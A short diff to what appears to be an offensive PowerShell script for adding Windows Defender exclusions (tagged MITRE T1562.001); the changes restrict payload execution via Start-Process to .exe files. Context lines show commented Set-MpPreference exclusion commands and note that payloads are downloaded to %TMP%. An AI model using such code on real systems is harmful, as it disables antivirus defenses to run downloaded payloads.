@@ -1,4 +1,4 @@
-﻿<#
+<#
 .SYNOPSIS
    [MITRE T1562.001] Manage Windows Defender Exclusions.
 
@@ -527,7 +527,7 @@ If($Action -iMatch "(add|exec)")
          # Exclude : C:\Users\pedro\AppData\Local\Temp
          # Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
 
-         If($Arguments -ieq "Off")
+         If($Arguments -ieq "Off" -and $PayloadName -iMatch '(exe)$')
          {
             $ExecMe = "Start-Process " + "$PayloadName" -Join ''         
          }
@@ -549,7 +549,7 @@ If($Action -iMatch "(add|exec)")
          # Set-MpPreference -ExclusionProcess|ExclusionExtension "powershell|ps1" -Force
 
          ## NOTES: This function mandatory downloads payloads to %TMP%
-         If($Arguments -ieq "Off")
+         If($Arguments -ieq "Off" -and $PayloadName -iMatch '(exe)$')
          {
             $ExecMe = "Start-Process " + "$PayloadName" -Join ''         
          }
